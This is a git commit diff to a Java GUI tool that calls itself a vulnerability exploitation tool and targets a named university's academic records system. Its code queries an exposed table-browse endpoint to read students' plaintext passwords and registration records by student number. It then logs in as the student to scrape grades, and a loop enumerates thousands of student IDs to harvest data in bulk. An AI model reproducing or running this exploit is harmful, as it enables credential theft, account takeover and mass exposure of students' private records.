258128b38897dddea937eec6e0c649ba8ed77c6d
a18366117049 <tyrant@yeah.net>
2015-06-06 10:56:30 +0800

    拓展了查成绩功能

--- edu_vul_use/src/edu_vul_use/client.java
+++ edu_vul_use/src/edu_vul_use/client.java
@@ -11,103 +11,210 @@ import java.util.Iterator;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import org.apache.commons.httpclient.*;
+import org.apache.commons.httpclient.methods.GetMethod;
+import org.apache.commons.httpclient.methods.PostMethod;
+
+import org.htmlparser.visitors.TextExtractingVisitor;
+import org.htmlparser.Parser;
 
 public class client {
-	public static String request(String url) 
-	{
+	public static String request(String url) {
 		StringBuffer bs = new StringBuffer();
 		try {
 			URL url_need = new URL(url);
 			URLConnection urlcon;
 			urlcon = url_need.openConnection();
 			InputStream is = urlcon.getInputStream();
-			BufferedReader buffer = new BufferedReader(new InputStreamReader(is));
+			BufferedReader buffer = new BufferedReader(
+					new InputStreamReader(is));
 			String l = null;
-				while((l=buffer.readLine())!=null)
-			 		{
-					bs.append(l).append("/n");
-			 		}           
+			while ((l = buffer.readLine()) != null) {
+				bs.append(l).append("/n");
+			}
 
-		    } catch (IOException e) {
+		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
-		    						}
+		}
 		return bs.toString();
-		
+
 	}
-	public static ArrayList <String> re_info(String s)//regular match html to get info
-	{	
-		ArrayList <String> info_list= new ArrayList<String>(); 
-		String temp="";
-		Pattern pattern = Pattern.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
+
+	public static String grade(String sno)
+
+	{
+		String textInPage = "";
+		int statusCode = 0;
+		HttpClient httpclient = new HttpClient();
+		PostMethod postMethod = new PostMethod(
+				"http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bks_login2.login");
+		String password = client.re_password(client.request(client
+				.get_url_1(sno)));
+		password = password.substring(0, password.length() - 1);
+		NameValuePair[] data = { new NameValuePair("stuid", sno),
+				new NameValuePair("pwd", password) };
+		postMethod.setRequestBody(data);
+		try {
+			statusCode = httpclient.executeMethod(postMethod);
+			if (statusCode == HttpStatus.SC_OK) {
+			} else if (statusCode == HttpStatus.SC_MOVED_PERMANENTLY
+					|| statusCode == HttpStatus.SC_MOVED_TEMPORARILY) {
+				Header locationHeader = postMethod
+						.getResponseHeader("Set-Cookie");
+				String cookie = null;
+				if (locationHeader != null) {
+					cookie = locationHeader.getValue();
+					int s = cookie.indexOf("=");
+					int e = cookie.indexOf(";");
+					cookie = cookie.substring(s + 1, e);
+					System.out.println(cookie);
+
+					GetMethod f = new GetMethod(
+							"http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bks_login2.loginmessage");
+					statusCode = httpclient.executeMethod(f);
+					if (statusCode == HttpStatus.SC_OK) {
+						System.out.println("µÇÂ¼³É¹¦");
+
+					} else {
+						System.out.println("µÇÂ¼Ê§°Ü");
+						System.exit(0);
+					}
+					f = new GetMethod(
+							"http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bkscjcx.curscopre");
+					statusCode = httpclient.executeMethod(f);
+					if (statusCode == HttpStatus.SC_OK) {
+						String grade = f.getResponseBodyAsString();
+
+						String ENCODE = "GBK";
+						Parser parser = Parser.createParser(grade, ENCODE);
+						TextExtractingVisitor visitor = new TextExtractingVisitor();
+						parser.visitAllNodesWith(visitor);
+						textInPage = visitor.getExtractedText();
+						textInPage.split("\r");
+						int a = textInPage.indexOf("¿Î³ÌÊôÐÔ");
+						textInPage = textInPage.substring(a + 4);
+
+					}
+
+				} else {
+					System.err.println("cookie value is null.");
+				}
+			}
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return textInPage;
+	}
+
+	public static ArrayList<String> re_info(String s)// regular match html to
+	{
+		ArrayList<String> info_list = new ArrayList<String>();
+		String temp = "";
+		Pattern pattern = Pattern
+				.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
 		Matcher matcher = pattern.matcher(s);
-		if(matcher.find())
-			{
-			temp=matcher.group(0);
+		if (matcher.find()) {
+			temp = matcher.group(0);
 			pattern = Pattern.compile("<TD ALIGN=\"LEFT\">");
 			matcher = pattern.matcher(temp);
-			temp=matcher.replaceAll("?");
+			temp = matcher.replaceAll("?");
 			pattern = Pattern.compile("</TD>/n");
 			matcher = pattern.matcher(temp);
-			temp=matcher.replaceAll(" ");
-			}
+			temp = matcher.replaceAll(" ");
+		}
 
-		while (temp.indexOf("?")>=0)
-		{
-			int start=temp.indexOf("?");
-			temp=temp.substring(start+1);
-			int end=temp.indexOf("?");
-			try
-				{
-				String content=temp.substring(0, end);
-				if (!content.equals(" "))
-					{
-					info_list.add(content);	
-					System.out.println("content:"+content);
-					}
+		while (temp.indexOf("?") >= 0) {
+			int start = temp.indexOf("?");
+			temp = temp.substring(start + 1);
+			int end = temp.indexOf("?");
+			try {
+				String content = temp.substring(0, end);
+				if (!content.equals(" ")) {
+					info_list.add(content);
 				}
-			catch(Exception e)
-			{
-				//½áÊø
-			}	
+			} catch (Exception e) {
+				// ½áÊø
+			}
 		}
 		return info_list;
-		}
-	
-	public static String re_password(String s)//regular match html to get password
-	{	String temp="";
-		Pattern pattern = Pattern.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
+	}
+
+	public static String re_password(String s)// regular match html to get
+	{
+		String temp = "";
+		Pattern pattern = Pattern
+				.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
 		Matcher matcher = pattern.matcher(s);
-		if(matcher.find())
-			{
-			temp=matcher.group(0);
+		if (matcher.find()) {
+			temp = matcher.group(0);
 			pattern = Pattern.compile("<TD ALIGN=\"LEFT\">");
 			matcher = pattern.matcher(temp);
-			temp=matcher.replaceAll("?");
+			temp = matcher.replaceAll("?");
 			pattern = Pattern.compile("</TD>/n");
 			matcher = pattern.matcher(temp);
-			temp=matcher.replaceAll(" ");
-			}
-		temp=temp.substring(1);
-		int start=temp.indexOf("?");
-		temp=temp.substring(start+1);
-		int end=temp.indexOf("?");
-		String pass=temp.substring(0, end);
-		return pass;
+			temp = matcher.replaceAll(" ");
 		}
-	public static String get_url_1(String sno)//get password url
-	{
-		String url="";
-		url="http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XK_MMB&ccolumns=*&cclauses=where%20xh%20=%27"+sno+"%27&nrow_min=1&nrow_max=150";
-		return url;		
-		
+		temp = temp.substring(1);
+		int start = temp.indexOf("?");
+		temp = temp.substring(start + 1);
+		int end = temp.indexOf("?");
+		String pass = temp.substring(0, end);
+		return pass;
 	}
-	public static String get_url_2(String sno)//get info url
+	
+	public static void makelist() {
+		long s = 201200131000l;
+//		long s_z = 201205130000l;
+//		long s_g = 201208130000l;
+		for (int i = 1; i <= 9999; i++) {
+			s = s + 1;
+			String sno = Long.toString(s);
+			String info = "";
+			try {
+				ArrayList<String> list = client.re_info(client.request(client
+						.get_url_2(sno)));
+				if (list.isEmpty())
+					;
+				else {
+					Iterator<String> it = list.iterator();
+					for (int j = 0; j <= 1; j++) {
+						if (it.hasNext())
+
+							info = info + it.next();
+					}
+					info += "\n";
+					System.out.println(info);
+				}
+			} catch (Exception e) {
+				System.out.println("exception!!!!	" + sno);
+
+			}
+
+		}
+
+	}
+
+	public static String get_url_1(String sno)// get password url
 	{
-		String url="";
-		url="http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XJ_XJB&ccolumns=*&cclauses=where%20xh%20=%27"+sno+"%27&nrow_min=1&nrow_max=150";
-		return url;		
-		
+		String url = "";
+		url = "http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XK_MMB&ccolumns=*&cclauses=where%20xh%20=%27"
+				+ sno + "%27&nrow_min=1&nrow_max=150";
+		return url;
+	}
+
+	public static String get_url_2(String sno)// get info url
+	{
+		String url = "";
+		url = "http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XJ_XJB&ccolumns=*&cclauses=where%20xh%20=%27"
+				+ sno + "%27&nrow_min=1&nrow_max=150";
+		return url;
+	}
+
+	public static void main(String[] args) {
+		// makelist();
+
 	}
 
 }
--- edu_vul_use/src/edu_vul_use/gui.java
+++ edu_vul_use/src/edu_vul_use/gui.java
@@ -1,7 +1,7 @@
 package edu_vul_use;
 
-import java.awt.BorderLayout;
 import java.awt.Dimension;
+import java.awt.TextArea;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.util.ArrayList;
@@ -12,59 +12,80 @@ import javax.swing.JFrame;
 import javax.swing.JLabel;
 import javax.swing.JOptionPane;
 import javax.swing.JPanel;
+import javax.swing.JScrollPane;
 import javax.swing.JTextField;
 
 public class gui {
 	private JFrame jf;
 	private JPanel jp;
-	private JTextField jt;//学号
+	private JTextField jt;// 学号
 	private JLabel jl1;
-	Dimension size = new Dimension(350, 170);//大小
-	JButton jb1,jb2;
-	
-	public gui(){
-		   jf=new JFrame("清华大学选课系统漏洞利用工具");
-		   jf.setBounds(0, 0, 350, 170);
-		   jp=new JPanel();
-		   jp.setLayout(null);   
-		   jl1=new JLabel("学号：");
-		   jl1.setBounds(30, 25, 50, 30);
-		   jp.add(jl1);
-	       jt=new JTextField(12);
-	       jt.setBounds(100,25,200,30);
-	       jp.add(jt);
-	       jp.setPreferredSize(size);
-	       jb1=new JButton("查密码");
-	       jb1.addMouseListener(new MouseAdapter(){    
-	    	   public void mouseClicked(MouseEvent e)    {
-	    	   String sno=jt.getText();
-	    	   String password= client.re_password(client.request(client.get_url_1(sno)));
-	    	   JOptionPane.showMessageDialog(null,"密码： "+password,"密码",JOptionPane.INFORMATION_MESSAGE);
-	    	   }});
-	       jb1.setBounds(30,80,100,30);
-	       jp.add(jb1);
-	       jb2=new JButton("查信息");
-	       jb2.setBounds(180,80,100,30);
-	       jb2.addMouseListener(new MouseAdapter(){    
-	    	   public void mouseClicked(MouseEvent e)    {
-	    	   String sno=jt.getText();
-	    	   ArrayList<String> list= client.re_info(client.request(client.get_url_2(sno)));
-	    	   String info="\n";
-	    	   Iterator<String> it=list.iterator();
-	    	   while(it.hasNext())
-	    		   info=info+it.next()+"\n";
-	    	   JOptionPane.showMessageDialog(null,"信息： "+info,"学籍信息：",JOptionPane.INFORMATION_MESSAGE);
-	    	   
-	    	   }});
-	       jp.add(jb2);
-	       jf.add(jp);     
-	       jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-	       jf.setVisible(true);
+	Dimension size = new Dimension(500, 170);// 大小
+	JButton jb1, jb2, jb3;
 
+	public gui() {
+		jf = new JFrame("漏洞利用工具  by xy");
+		jf.setBounds(0, 0, 500, 170);
+		jp = new JPanel();
+		jp.setLayout(null);
+		jl1 = new JLabel("学号：");
+		jl1.setBounds(30, 25, 50, 30);
+		jp.add(jl1);
+		jt = new JTextField(12);
+		jt.setBounds(100, 25, 200, 30);
+		jp.add(jt);
+		jp.setPreferredSize(size);
+		jb1 = new JButton("查密码");
+		jb1.addMouseListener(new MouseAdapter() {
+			public void mouseClicked(MouseEvent e) {
+				String sno = jt.getText();
+				String password = client.re_password(client.request(client
+						.get_url_1(sno)));
+				JOptionPane.showMessageDialog(null, "密码： " + password, "密码",
+						JOptionPane.INFORMATION_MESSAGE);
+			}
+		});
+		jb1.setBounds(30, 80, 100, 30);
+		jp.add(jb1);
+		jb2 = new JButton("查信息");
+		jb2.setBounds(180, 80, 100, 30);
+		jb2.addMouseListener(new MouseAdapter() {
+			public void mouseClicked(MouseEvent e) {
+				String sno = jt.getText();
+				ArrayList<String> list = client.re_info(client.request(client
+						.get_url_2(sno)));
+				String info = "\n";
+				Iterator<String> it = list.iterator();
+				while (it.hasNext())
+					info = info + it.next() + "\n";
+				JOptionPane.showMessageDialog(null, "信息： " + info, "学籍信息：",
+						JOptionPane.INFORMATION_MESSAGE);
+
+			}
+		});
+		jb3 = new JButton("查成绩");
+		jb3.setBounds(330, 80, 100, 30);
+		jb3.addMouseListener(new MouseAdapter() {
+			public void mouseClicked(MouseEvent e) {
+				String sno = jt.getText();
+				String s = client.grade(sno);
+				TextArea textArea = new TextArea();
+				textArea.setText(s);
+				JOptionPane.showMessageDialog(null, new JScrollPane(textArea));
+
+			}
+		});
+
+		jp.add(jb2);
+		jp.add(jb3);
+		jf.add(jp);
+		jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+		jf.setVisible(true);
 
 	}
+
 	public static void main(String[] args) {
-		new gui();	
+		new gui();
 	}
 
 }
